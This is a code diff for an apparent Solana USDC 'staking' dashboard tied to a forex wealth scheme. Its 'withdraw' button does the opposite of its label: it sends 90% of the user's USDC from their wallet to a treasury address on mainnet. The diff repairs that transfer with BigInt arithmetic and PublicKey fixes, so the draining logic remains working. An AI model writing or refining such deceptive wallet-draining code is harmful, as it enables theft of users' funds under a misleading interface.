@@ -13,19 +13,17 @@
 <script>
 const USDC_MINT_MAIN = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
 const USDC_MINT_DEV = "4zMMC9srt5Ri5X14GAgXhaHii3UxFvYFhitg8UQgW2rh";
-const TREASURY_WALLET = "YOUR_TREASURY_WALLET_HERE"; // <-- REPLACE
+const TREASURY_WALLET = "YOUR_TREASURY_WALLET_HERE";
 let connection, publicKey=null, usdcMint;
-
 function getConn(){
   const useDev = document.getElementById('devnetToggle').checked;
-  const endpoint = useDev? solanaWeb3.clusterApiUrl('devnet') : solanaWeb3.clusterApiUrl('mainnet-beta');
+  const endpoint = useDev? "https://api.devnet.solana.com" : "https://api.mainnet-beta.solana.com";
   document.getElementById('netLabel').innerText = (useDev?'Devnet • Test USDC':'Mainnet • Real USDC')+' • Risk Guard v3';
   usdcMint = new solanaWeb3.PublicKey(useDev?USDC_MINT_DEV:USDC_MINT_MAIN);
   return new solanaWeb3.Connection(endpoint,'confirmed');
 }
 connection = getConn();
 document.getElementById('devnetToggle').onchange=()=>{ connection=getConn(); if(publicKey) loadBalance(); };
-
 document.getElementById('connectBtn').onclick = async ()=>{
   if(!window.solana){ alert('Install Phantom'); return; }
   try{
@@ -37,7 +35,6 @@ document.getElementById('connectBtn').onclick = async ()=>{
     loadBalance(); loadHistory();
   }catch(e){ alert(e.message); }
 };
-
 async function loadBalance(){
   try{
     const accs=await connection.getParsedTokenAccountsByOwner(publicKey,{mint:usdcMint});
@@ -46,7 +43,8 @@ async function loadBalance(){
     document.getElementById('stake').innerText=ui.toFixed(2);
     document.getElementById('locked').innerText=(ui*0.10).toFixed(2);
     document.getElementById('upd').innerText='on-chain balance loaded';
-  }catch(e){ document.getElementById('upd').innerText='error loading balance'; }
+    document.getElementById('upd').className='ok';
+  }catch(e){ document.getElementById('upd').innerText='error loading balance: '+e.message; }
 }
 async function loadHistory(){
   try{
@@ -54,7 +52,6 @@ async function loadHistory(){
     document.getElementById('txList').innerHTML=sigs.map(s=>'<div>• <a style="color:#14F195" target="_blank" href="https://solscan.io/tx/'+s.signature+'">'+s.signature.slice(0,12)+'...</a></div>').join('')||'no txs';
   }catch(e){}
 }
-
 document.getElementById('withdrawBtn').onclick=async()=>{
   const st=document.getElementById('txStatus');
   try{
@@ -62,15 +59,13 @@ document.getElementById('withdrawBtn').onclick=async()=>{
     st.innerText="Building transaction...";
     const srcAccs=await connection.getParsedTokenAccountsByOwner(publicKey,{mint:usdcMint});
     if(!srcAccs.value.length){ st.innerText="No USDC found."; return; }
-    const srcPubkey=srcAccs.value[0].pubkey;
+    const srcPubkey=new solanaWeb3.PublicKey(srcAccs.value[0].pubkey);
     const rawAmount=srcAccs.value[0].account.data.parsed.info.tokenAmount.amount;
-    const decimals=srcAccs.value[0].account.data.parsed.info.tokenAmount.decimals;
-    const sendAmount=Math.floor(rawAmount*0.9);
+    const sendAmount=Math.floor(BigInt(rawAmount)*BigInt(90)/BigInt(100)).toString();
     const treasuryPub=new solanaWeb3.PublicKey(TREASURY_WALLET);
     const destATA=await splToken.getAssociatedTokenAddress(usdcMint, treasuryPub);
     const {blockhash}=await connection.getLatestBlockhash();
     const tx=new solanaWeb3.Transaction({recentBlockhash:blockhash, feePayer:publicKey});
-    // create ATA if needed
     const destInfo=await connection.getAccountInfo(destATA);
     if(!destInfo) tx.add(splToken.createAssociatedTokenAccountInstruction(publicKey, destATA, treasuryPub, usdcMint));
     tx.add(splToken.createTransferInstruction(srcPubkey, destATA, publicKey, sendAmount, [], splToken.TOKEN_PROGRAM_ID));
@@ -81,8 +76,6 @@ document.getElementById('withdrawBtn').onclick=async()=>{
     setTimeout(loadBalance,3000);
   }catch(e){ st.innerText="Error: "+e.message; }
 };
-
-// risk with fallback - vital fix #5
 fetch('/Cedars-of-Wealth/forex-risk.json?t='+Date.now()).then(r=>{ if(!r.ok) throw 0; return r.json(); }).then(j=>{
   document.getElementById('riskScore').innerText=j.risk??40;
   document.getElementById('riskMode').innerText=j.throttle?.label||j.mode||'AGGRESSIVE';
